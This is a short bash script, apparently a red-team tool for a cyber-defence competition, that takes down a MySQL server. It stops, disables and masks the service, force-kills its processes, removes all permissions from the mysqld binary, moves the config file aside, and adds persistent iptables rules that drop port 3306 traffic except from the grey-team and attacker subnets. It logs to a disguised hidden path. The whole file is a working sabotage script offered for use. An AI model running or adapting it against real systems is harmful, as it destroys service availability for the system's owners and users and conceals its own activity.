#!/bin/bash

# ── WHITELIST ──────────────────────────────────────────
WHITELIST=("greyteam" "scoring")
LOG="/var/lib/.cache/mysql_watch.log"
# ──────────────────────────────────────────────────────

echo "[$(date)] Running MySQL takedown..." >> $LOG

# 1. Stop and mask MySQL
systemctl stop mysql          2>/dev/null
systemctl stop mysql.service  2>/dev/null
systemctl disable mysql       2>/dev/null
systemctl mask mysql          2>/dev/null

# 2. Kill all MySQL processes
pkill -9 mysqld               2>/dev/null
pkill -9 mysqld_safe          2>/dev/null
pkill -9 mysql                2>/dev/null

# 3. Remove execute permission on binary
chmod 000 /usr/sbin/mysqld    2>/dev/null

# 4. Corrupt config
if [ -f /etc/mysql/mysql.conf.d/mysqld.cnf ]; then
    mv /etc/mysql/mysql.conf.d/mysqld.cnf \
       /etc/mysql/mysql.conf.d/mysqld.cnf.bak
fi

# 5. Block MySQL port at firewall level
#    but whitelist grey team and scoring IPs
iptables -A INPUT  -p tcp --dport 3306 \
    -s 10.100.0.0/24 -j ACCEPT          # allow grey team net
iptables -A INPUT  -p tcp --dport 3306 \
    -s 10.100.1.0/24 -j ACCEPT          # allow red net (yourself)
iptables -A INPUT  -p tcp --dport 3306 -j DROP   # drop everyone else

# 6. Save iptables rules so they survive reboot
iptables-save > /etc/iptables/rules.v4  2>/dev/null || \
iptables-save > /etc/iptables.rules     2>/dev/null

echo "[$(date)] Takedown complete" >> $LOG
systemctl status mysql >> $LOG 2>&1